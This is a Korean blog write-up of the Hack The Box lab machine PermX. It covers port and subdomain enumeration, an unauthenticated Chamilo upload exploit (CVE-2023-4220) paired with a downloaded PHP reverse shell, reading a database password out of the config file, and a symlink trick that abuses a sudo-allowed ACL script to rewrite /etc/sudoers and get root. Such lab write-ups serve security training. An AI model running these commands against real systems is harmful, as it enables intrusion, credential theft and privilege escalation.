---
title: "PermX  HTB 가치 분석 및 사용법"
description: ""
coverImage: "/assets/img/2024-07-09-PermXHTB_0.png"
date: 2024-07-09 22:54
ogImage: 
  url: /assets/img/2024-07-09-PermXHTB_0.png
tag: Tech
originalTitle: "PermX — HTB"
link: "https://medium.com/@kript0r3x/permx-htb-84871140b508"
---


<img src="/assets/img/2024-07-09-PermXHTB_0.png" />

리눅스 머신이고, nmap 스캔을 시작하면 두 개의 열린 포트가 나타납니다.

```js
$ nmap -A -sV -sC 10.129.84.129 -oA nmap/PermX
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-08 10:52 EDT
Nmap scan report for 10.129.84.129
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

80번 포트에서 실행되는 웹 서버가 http://permx.htb를 가리킵니다. vhosts에 추가하고 해당 URL로 이동하면 정적 웹 사이트가 표시됩니다. 흥미로운 내용은 없습니다.

<div class="content-ad"></div>

그럼, ffuf를 사용하여 하위 도메인 열거를 수행하면 lms.permx.htb 하위 도메인을 확인할 수 있습니다.

```js
└─$ ffuf -w /opt/useful/Discovery/Web-Content/big.txt:FUZZ -u http://permx.htb:80 -H "Host: FUZZ.permx.htb" -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb:80
 :: Wordlist         : FUZZ: /opt/useful/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1389ms]
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 72ms]
:: Progress: [20476/20476] :: Job [1/1] :: 604 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

그 후 vhosts에 추가하고 웹 사이트를 방문하면 Chamilo 웹 애플리케이션의 로그인 페이지가 표시됩니다.

<img src="/assets/img/2024-07-09-PermXHTB_1.png" />

<div class="content-ad"></div>

채밀로 애플리케이션의 최근 취약점을 찾던 중, 아래 GitHub을 발견했어요. 거기에는 인증되지 않은 역방향 코드 실행을 얻기 위한 POC가 나와 있어요.

위 PHP 역술을 사용하면, 위 POC로 역방향 쉘을 획득할 수 있어요. (공격 호스트의 IP 주소로 IP 주소를 수정해주세요)

[https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

```js
─$ ./CVE-2023-4220.sh -f php-reverse-shell.php -h http://lms.permx.htb -p 1234
-e 
curl: (6) Could not resolve host: lms.permx.htb

# 아래 명령어를 사용하여 TTY를 상호작용하는 데에 사용할 수 있어요;)
# python3 -c 'import pty;pty.spawn("/bin/bash")'
# export TERM=xterm
# CTRL + Z
# stty raw -echo; fg

# 포트 1234에서 역술을 시작했어요. . . . . . . 
```

<div class="content-ad"></div>

www-data 사용자로 쉘에 접속했습니다. linpeas를 실행하여 로컬호스트에서 chamilo 사용자의 데이터베이스 자격 증명을 찾았습니다. 홈 디렉토리를 살펴보니 mtz라는 사용자가 있었습니다. 찾은 비밀번호를 사용하여 mtz 사용자로 호스트에 SSH로 접속했습니다.

```js
/var/www/chamilo/app/config/configuration.php:$_configuration['auth_password_links'] = [                
/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

```js
cat /var/www/chamilo/app/config/configuration.php
<?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
/* For licensing terms, see /license.txt */
/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;

/**
```

mtz 사용자로 호스트에 로그인한 후, 사용자 플래그를 찾았습니다. 또한, 이 사용자가 root로서 '/opt/acl.sh'와 같은 사용자 지정 스크립트를 실행할 수 있다는 것을 알게 되었습니다.

<div class="content-ad"></div>

```js
사용자 mtz가 permx에서 다음 명령을 실행할 수 있습니다:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

이 스크립트는 모든 사용자에 대해 파일의 권한을 변경할 수 있지만 /home/mtz 디렉토리의 파일 권한만 변경할 수 있습니다.

```js
mtz@permx:~$ cat /opt/acl.sh 
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

이 스크립트를 사용하여 sudoers 파일의 권한을 변경하고 mtz 사용자에게 호스트에서 sudo 권한을 부여했습니다. 이를 위해 /home/mtz 디렉토리에 /etc/sudoers 파일에 대한 심볼릭 링크를 만들고 사용자에게 읽기/쓰기 권한을 부여하기 위해 스크립트를 사용했습니다.

<div class="content-ad"></div>

```js
mtz@permx:~$ ln -s /etc/sudoers ./tada
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/tada
```

다음과 같이 sudoers 파일을 수정했습니다.

```js
<SNIP>

@includedir /etc/sudoers.d
mtz ALL=(ALL:ALL) NOPASSWD: ALL
```

다시 로그인하고 'sudo su'를 입력하면 루트 셸을 얻을 수 있습니다.


<div class="content-ad"></div>

```js
mtz@permx:~$ sudo su
root@permx:/home/mtz# cd /root
root@permx:~# ls
backup  reset.sh  root.txt
```